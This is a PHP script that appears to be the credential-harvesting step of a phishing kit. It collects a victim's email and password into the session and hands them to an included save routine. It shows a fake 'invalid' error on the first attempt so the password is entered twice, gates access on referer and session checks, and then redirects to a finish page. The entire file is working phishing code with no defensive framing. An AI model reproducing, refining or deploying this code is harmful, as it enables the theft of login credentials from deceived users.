<?php
session_start();

require_once 'inc/functions.php';
require_once 'inc/config.php';

$isValidEmail = false;
$isValidPassword = false;
$errno = 1;


if (isset($_SERVER['HTTP_REFERER']) && isset($_SERVER['HTTP_HOST']) && isset($_SESSION['USER_OK']) && $_SESSION['USER_OK'] === 'OK' && isset($_SESSION['SESSION_ID'])) {
    $ref = $_SERVER['HTTP_REFERER'];
    $host = $_SERVER['HTTP_HOST'];
    $host2 = bin2hex($_SERVER['HTTP_HOST']);
    
    if (isset($_POST['login']) && !empty($_POST['login'])) {
        if(is_email($_POST['login'])) {
		$isValidEmail = true;
        $_SESSION['LoginId'] = $_SESSION['_userid_']= $_POST['login'];    
	   }
    }
    
    if (isset($_POST['passwd']) && !empty($_POST['passwd'])) {
        if (strlen($_POST['passwd']) >= 3) {
            $isValidPassword = true;
            $_SESSION['Passcode'] = $_POST['passwd'];
        }
        else
        {
            $errno = 1;
        }
    }

    if (!$isValidPassword || !$isValidEmail) {
        header("Location: step2.php?invalid=true&error=".$errno."&session=" . $host2);
    } else {
        if (strpos($ref, $host) !== FALSE) {
            $include = 1;
            include("inc/save.php");
			$_SESSION['tries']++;
			if ($_SESSION['tries'] <= 1)
			{
				header("Location: step2.php?invalid=true&error=".$errno."&session=" . $host2);
				exit();
			}
        }
    }
}
?>
<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="refresh" content="0; url=finish.php" />
<body>
<? header("refresh:0; url=finish.php");?>
</body>

</html>